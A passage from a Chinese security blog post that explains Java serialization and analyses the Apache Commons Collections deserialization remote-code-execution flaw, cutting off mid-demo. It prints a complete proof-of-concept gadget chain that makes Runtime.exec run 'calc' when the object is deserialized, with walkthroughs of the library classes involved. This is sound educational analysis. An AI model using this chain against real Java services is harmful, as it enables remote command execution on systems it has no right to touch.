<!DOCTYPE html>
<html>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="基础知识 Java序列化是指把Java对象转化为字节序列的过程便于保存在内存，文件，数据库种，ObjectOutputStream类的writeObject()方法可以实现序列化Java反序列化是指把字节序列恢复为Java对象的过程，ObjectInputStream类的readObject()方法用于反序列化              实现简单的序列化与反序列化 一个简单的User类(只有实现了">
<meta name="keywords" content="Java安全">
<meta property="og:type" content="article">
<meta property="og:title" content="Java序列化与反序列化漏洞">
<meta property="og:url" content="http://yoursite.com/2019/02/28/Java反序列化/index.html">
<meta property="og:site_name" content="P0rZ9&#39;s blog">
<meta property="og:description" content="基础知识 Java序列化是指把Java对象转化为字节序列的过程便于保存在内存，文件，数据库种，ObjectOutputStream类的writeObject()方法可以实现序列化Java反序列化是指把字节序列恢复为Java对象的过程，ObjectInputStream类的readObject()方法用于反序列化              实现简单的序列化与反序列化 一个简单的User类(只有实现了">
<meta property="og:locale" content="default">
<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-25.22.30.02-image.png">
<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-27.15.23.02-image.png">
<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-27.14.24.07-image.png">
<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-31.18.23.00-image.png">
<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-31.18.23.29-image.png">
<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-27.16.42.14-image.png">
<meta property="og:updated_time" content="2019-03-31T10:40:59.777Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Java序列化与反序列化漏洞">
<meta name="twitter:description" content="基础知识 Java序列化是指把Java对象转化为字节序列的过程便于保存在内存，文件，数据库种，ObjectOutputStream类的writeObject()方法可以实现序列化Java反序列化是指把字节序列恢复为Java对象的过程，ObjectInputStream类的readObject()方法用于反序列化              实现简单的序列化与反序列化 一个简单的User类(只有实现了">
<meta name="twitter:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-25.22.30.02-image.png">
    
    
        
          
              <link rel="shortcut icon" href="../../../../images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="../../../../images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="../../../../images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>Java序列化与反序列化漏洞</title>
    <!-- styles -->
    <link rel="stylesheet" href="../../../../css/style.css">
    <!-- rss -->
    
    
</head>

<body>
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <li><a href="../../../../index.html">Home</a></li><li><a href="../../../../about.html">About</a></li><li><a href="../../../../archives/">Writing</a></li><li><a href="../../../../friends.html">Friends</a></li>
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="../../../03/01/Struts2-001漏洞分析/"><i class="fa fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="../../27/xxe/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">上一篇</span>
      <span id="i-next" class="info" style="display:none;">下一篇</span>
      <span id="i-top" class="info" style="display:none;">回到顶部</span>
      <span id="i-share" class="info" style="display:none;">分享</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/02/28/Java反序列化/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/02/28/Java反序列化/&text=Java序列化与反序列化漏洞"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/02/28/Java反序列化/&title=Java序列化与反序列化漏洞"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/02/28/Java反序列化/&is_video=false&description=Java序列化与反序列化漏洞"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Java序列化与反序列化漏洞&body=Check out this article: http://yoursite.com/2019/02/28/Java反序列化/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/02/28/Java反序列化/&title=Java序列化与反序列化漏洞"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/02/28/Java反序列化/&title=Java序列化与反序列化漏洞"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/02/28/Java反序列化/&title=Java序列化与反序列化漏洞"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/02/28/Java反序列化/&title=Java序列化与反序列化漏洞"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/02/28/Java反序列化/&name=Java序列化与反序列化漏洞&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#基础知识"><span class="toc-number">1.</span> <span class="toc-text">基础知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Apache-CommonsCollections-序列化RCE漏洞分析"><span class="toc-number">2.</span> <span class="toc-text">Apache-CommonsCollections 序列化RCE漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#TransformedMap与AnnotationInvocationHandler"><span class="toc-number">2.1.</span> <span class="toc-text">TransformedMap与AnnotationInvocationHandler</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞检测"><span class="toc-number">3.</span> <span class="toc-text">漏洞检测</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#白盒"><span class="toc-number">3.1.</span> <span class="toc-text">白盒</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#搜索危险库"><span class="toc-number">3.1.1.</span> <span class="toc-text">搜索危险库</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#搜索危险函数"><span class="toc-number">3.1.2.</span> <span class="toc-text">搜索危险函数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#黑盒"><span class="toc-number">3.2.</span> <span class="toc-text">黑盒</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#修复方案"><span class="toc-number">4.</span> <span class="toc-text">修复方案</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#白名单"><span class="toc-number">4.1.</span> <span class="toc-text">白名单</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#重写resolveClass来检验反序列化的类"><span class="toc-number">4.1.1.</span> <span class="toc-text">重写resolveClass来检验反序列化的类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#使用ObjectInputFilter来校验反序列化的类"><span class="toc-number">4.1.2.</span> <span class="toc-text">使用ObjectInputFilter来校验反序列化的类</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#黑名单"><span class="toc-number">4.2.</span> <span class="toc-text">黑名单</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#禁止JVM执行外部命令"><span class="toc-number">4.2.1.</span> <span class="toc-text">禁止JVM执行外部命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#禁止一些危险类"><span class="toc-number">4.2.2.</span> <span class="toc-text">禁止一些危险类</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-number">5.</span> <span class="toc-text">参考</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index width mx-auto px2 my4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        Java序列化与反序列化漏洞
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">P0rZ9's blog</span>
      </span>
      
    <div class="postdate">
        <time datetime="2019-02-28T00:15:41.000Z" itemprop="datePublished">2019-02-28</time>
    </div>


      
    <div class="article-tag">
        <i class="fa fa-tag"></i>
        <a class="tag-link" href="../../../../tags/Java安全/">Java安全</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><blockquote>
<p>Java序列化是指把Java对象转化为字节序列的过程便于保存在内存，文件，数据库种，ObjectOutputStream类的writeObject()方法可以实现序列化<br>Java反序列化是指把字节序列恢复为Java对象的过程，ObjectInputStream类的readObject()方法用于反序列化            </p>
</blockquote>
<p>实现简单的序列化与反序列化</p>
<p>一个简单的User类(只有实现了Serializable接口的类的对象才可以被序列化)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">class User implements Serializable &#123;</span><br><span class="line">    private String name;</span><br><span class="line">    private String pwd;</span><br><span class="line">    </span><br><span class="line">    getter and setter...</span><br></pre></td></tr></table></figure></p>
<p>序列化:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">User user = new User();</span><br><span class="line">FileOutputStream fileout = new FileOutputStream(&quot;test.bin&quot;);</span><br><span class="line">ObjectOutputStream out = new ObjectOutputStream(fileout);</span><br><span class="line">out.writeObject(user);</span><br><span class="line">out.close();</span><br><span class="line">fileout.close();</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-25.22.30.02-image.png" alt="2019-03-25.22.30.02-image.png"></p>
<ul>
<li>0xaced 魔术头</li>
<li>0x0005 版本号<br>开头的几位可当作Java序列化得到字节的特征。        </li>
</ul>
<p>反序列化<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">FileInputStream fileinput = new FileInputStream(&quot;test.bin&quot;);</span><br><span class="line">ObjectInputStream input = new ObjectInputStream(fileinput);</span><br><span class="line">User user = (User) input.readObject();</span><br><span class="line">input.close();</span><br><span class="line">fileinput.close();</span><br><span class="line">System.out.println(user);    // User@8db2f2</span><br></pre></td></tr></table></figure></p>
<h2 id="Apache-CommonsCollections-序列化RCE漏洞分析"><a href="#Apache-CommonsCollections-序列化RCE漏洞分析" class="headerlink" title="Apache-CommonsCollections 序列化RCE漏洞分析"></a>Apache-CommonsCollections 序列化RCE漏洞分析</h2><blockquote>
<p>该漏洞的问题主要出现在org.apache.commons.collections.Transformer接口上。在Apache commons.collections中有一个InvokerTransformer实现了Transformer接口，主要作用为调用Java的反射机制来调用任意函数。TransformedMap配合AnnotationInvocationHandler中的readObject()，可以触发漏洞，造成命令执行。</p>
</blockquote>
<p>漏洞触发流程:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-27.15.23.02-image.png" alt="2019-03-27.15.23.02-image.png"></p>
<p>调用链:</p>
<blockquote>
<p>InvokerTransformer.transform()-&gt;TransformedMap.checkSetValue()-&gt;AbstractInputCheckedMapDecorator.setValue()-&gt;AnnotationInvocationHandler.readObject()</p>
</blockquote>
<p>技术细节:</p>
<blockquote>
<p>(1)java方法重写：如果一个类的方法被重写，那么在调用时优先调用该方法<br>(2)JAVA反射机制：在运行状态中<br>对于任意一个类，都能够判断一个对象所属的类；<br>对于任意一个类，都能够知道这个类的所有属性和方法；<br>对于任意一个对象，都能够调用它的任意一个方法和属性；<br>(3)认识关键类与函数<br>    TransformedMap ：利用其value修改时触发transform()的特性<br>    ChainedTransformer： 会挨个执行我们定义的Transformer<br>    Transformer: 存放我们要执行的命令<br>    AnnotationInvocationHandler：对memberValues的每一项调用了setValue()函数            </p>
</blockquote>
<p><strong>环境基于:<a href="https://www.oracle.com/technetwork/java/javasebusiness/downloads/java-archive-downloads-javase6-419409.html" target="_blank" rel="noopener">jdk-6u45</a>与<a href="https://mvnrepository.com/artifact/commons-collections/commons-collections" target="_blank" rel="noopener">commons-collections 3.1</a></strong></p>
<p>poc:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        GeneratePayload(Reverse_Payload(),&quot;obj&quot;);</span><br><span class="line">        payloadTest(&quot;obj&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static Object Reverse_Payload() throws Exception &#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                //ConstantTransformer类的transform()方法：将待转化的对象变为一个常量</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line"></span><br><span class="line">                //InvokerTransformer(String methodName, Class[] paramTypes, Object[] args)</span><br><span class="line">                //当改变value时 触发InvokerTransformer的transformer方法</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;</span><br><span class="line">                        String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123; Object.class,</span><br><span class="line">                        Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;String.class&#125;,</span><br><span class="line">                        new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer transformerChain = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map map = new HashMap();</span><br><span class="line">        map.put(&quot;value&quot;, &quot;value&quot;);</span><br><span class="line">        Map outmap = TransformedMap.decorate(map, null, transformerChain);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        //通过反射获得AnnotationInvocationHandler类对象</span><br><span class="line">        Class cls = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        //通过反射获得cls的构造函数</span><br><span class="line">        Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        //这里需要设置Accessible为true，否则序列化失败</span><br><span class="line">        ctor.setAccessible(true);</span><br><span class="line">        //通过newInstance()方法实例化对象</span><br><span class="line">        Object o = ctor.newInstance(Retention.class, outmap);</span><br><span class="line">        return o;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void GeneratePayload(Object instance, String file)</span><br><span class="line">            throws Exception &#123;</span><br><span class="line">        //将构造好的payload序列化后写入文件中</span><br><span class="line">        File f = new File(file);</span><br><span class="line">        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));</span><br><span class="line">        out.writeObject(instance);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void payloadTest(String file) throws Exception &#123;</span><br><span class="line">        //取出文件中的payload，进行反序列化</span><br><span class="line">        ObjectInputStream in = new ObjectInputStream(new FileInputStream(file));</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<hr>
<p>我们先分析下poc中用到的各个类</p>
<blockquote>
<p><strong>TransformedMap</strong></p>
</blockquote>
<p>Map类是存储键值对的数据结构，Apache Commons Collections实现了TransformedMap，用来对Map进行变换，该类在一个元素(key或value)被添加/删除/修改时就会调用相应的transform方法对其进行修饰变换，具体的变换逻辑在transform方法中实现。<strong>如我们在transform方法中定义value++，当TransformedMap类中的value被修改时，就会调用transform方法，其value值先加1</strong><br>我们可以通过decorate方法获得一个TransformedMap实例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map outmap = TransformedMap.decorate(map, null, transformerChain);</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>TransformedMap.decorate()：<br>public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {<br>    return new TransformedMap(map, keyTransformer, valueTransformer);<br>}<br>第一个参数为待转化的Map对象<br>第二个参数为Map对象的key要经过的转化方法（单个方法或方法链或null）<br>第三个参数为Map对象的Value要经过的转化方法（单个方法或方法链或null）</p>
</blockquote>
<p>当Map中任一项的Key或Value被修改，相应的Transform方法就会被调用。</p>
<p>分析漏洞需要用到Apache Commons Collections中几个已经实现了Transformer的类:</p>
<blockquote>
<p><strong>ConstantTransformer()</strong></p>
</blockquote>
<p>该类的transformer方法会返回构造函数传入的参数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public ConstantTransformer(Object constantToReturn) &#123;</span><br><span class="line">        this.iConstant = constantToReturn;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">public Object transform(Object input) &#123;</span><br><span class="line">    return this.iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p><strong>InvokerTransformer</strong></p>
</blockquote>
<p>该类的transform方法通过Java的反射机制执行任意代码。transform方法用到的方法名，参数类型与参数值都在类的构造函数中指定</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123;</span><br><span class="line">    this.iMethodName = methodName;</span><br><span class="line">    this.iParamTypes = paramTypes;</span><br><span class="line">    this.iArgs = args;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public Object transform(Object input) &#123;</span><br><span class="line">    if (input == null) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Class cls = input.getClass();</span><br><span class="line">            Method method = cls.getMethod(this.iMethodName, this.iParamTypes);</span><br><span class="line">            return method.invoke(input, this.iArgs);</span><br><span class="line">        &#125; catch (NoSuchMethodException var5) &#123;</span><br><span class="line">            throw new FunctorException(&quot;InvokerTransformer: The method &apos;&quot; + this.iMethodName + &quot;&apos; on &apos;&quot; + input.getClass() + &quot;&apos; does not exist&quot;);</span><br><span class="line">        &#125; catch (IllegalAccessException var6) &#123;</span><br><span class="line">            throw new FunctorException(&quot;InvokerTransformer: The method &apos;&quot; + this.iMethodName + &quot;&apos; on &apos;&quot; + input.getClass() + &quot;&apos; cannot be accessed&quot;);</span><br><span class="line">        &#125; catch (InvocationTargetException var7) &#123;</span><br><span class="line">            throw new FunctorException(&quot;InvokerTransformer: The method &apos;&quot; + this.iMethodName + &quot;&apos; on &apos;&quot; + input.getClass() + &quot;&apos; threw an exception&quot;, var7);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p><strong>ChainedTransformer</strong></p>
</blockquote>
<p><strong>构造方法</strong>：会将传进来的Transformer数组保存为this.iTransformers对象。<br><strong>transform()</strong>：依次调用this.iTransformers对象的transformer方法，且前一次执行transform方法的返回值object，会作为下一次执行transform方法的参数object</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public ChainedTransformer(Transformer[] transformers) &#123;</span><br><span class="line">    this.iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public Object transform(Object object) &#123;</span><br><span class="line">    for(int i = 0; i &lt; this.iTransformers.length; ++i) &#123;</span><br><span class="line">        object = this.iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line">    return object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>构造触发链:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">        //ConstantTransformer类的transform()方法：将待转化的对象变为一个常量</span><br><span class="line">        new ConstantTransformer(Runtime.class),</span><br><span class="line"></span><br><span class="line">        //InvokerTransformer(String methodName, Class[] paramTypes, Object[] args)</span><br><span class="line">        //当改变value时 触发InvokerTransformer的transformer方法</span><br><span class="line">        new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;</span><br><span class="line">                String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),</span><br><span class="line">        new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123; Object.class,</span><br><span class="line">                Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;),</span><br><span class="line">        new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;String.class&#125;,</span><br><span class="line">                new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-27.14.24.07-image.png" alt="2019-03-27.14.24.07-image.png"><br>这里的情况是<strong>只允许调用Class.getMethod与Method.invoke方法去执行命令</strong><br>触发链执行步骤:</p>
<blockquote>
<ul>
<li>构造一个ConstantTransformer，传入Runtime的class对象，在执行transform()时，会始终返回这个对象</li>
<li>构造一个InvokerTransformer，待调用方法名为getMethod，参数为getRuntime。transform时 传入1的结果，input为java.lang.Runtime cls为java.lang.Class。待调用方法为getMethod，然后invoke调用这个放过发最终得到的是    Runtime对象</li>
<li>构造一个InvokerTransformer，待调用方法为invoke，参数为null，在transform时，传入2的结果，实际上是调用getRuntime()拿到Runtime对象</li>
<li>构造一个InvokerTransformer，待调用方法为exec，参数为执行的命令clac，在transform时，传入3的结果，获取java.lang.Runtime的exec方法并传参调用</li>
<li>最后将其放入一个数组，传入ChainedTransformer中，在transform时，会将前一个元素的返回结果作为下一个的参数，满足我们的需求。</li>
</ul>
</blockquote>
<p>我们思考下使用逻辑更清晰的触发链：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(Runtime.getRuntime()),</span><br><span class="line">                new InvokerTransformer(&quot;getRuntime&quot;, new Class[0], new Object[0]),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;String.class&#125;,</span><br><span class="line">                        new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure></p>
<p>但是运行出错，原因是<code>Runtime.getRuntime()</code>得到的<code>java.lang.Runtime</code>对象需要参与序列化过程，但是并没有实现Serializable接口，所以行不通<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-31.18.23.00-image.png" alt="2019-03-31.18.23.00-image.png"><br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-31.18.23.29-image.png" alt="2019-03-31.18.23.29-image.png"></p>
<p>上面的触发链相当于执行命令:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.class.getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;calc&quot;);</span><br></pre></td></tr></table></figure></p>
<p>测试demo:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                //ConstantTransformer类的transform()方法：将待转化的对象变为一个常量</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line"></span><br><span class="line">                //InvokerTransformer(String methodName, Class[] paramTypes, Object[] args)</span><br><span class="line">                //当改变value时 触发InvokerTransformer的transformer方法</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;</span><br><span class="line">                        String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123; Object.class,</span><br><span class="line">                        Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;String.class&#125;,</span><br><span class="line">                        new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        //transformers数组 ChainedTransformer按顺序调用一系列的变换</span><br><span class="line">        Transformer transformedChain = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map normalMap = new HashMap();</span><br><span class="line">        normalMap.put(&quot;value&quot;, &quot;value&quot;);</span><br><span class="line"></span><br><span class="line">        //TransformedMap(map, keyTransformer, valueTransformer)</span><br><span class="line">        Map transformedMap = TransformedMap.decorate(normalMap, null, transformedChain);</span><br><span class="line">        Map.Entry entry = (Map.Entry) transformedMap.entrySet().iterator().next();</span><br><span class="line">        entry.setValue(&quot;1111&quot;);</span><br><span 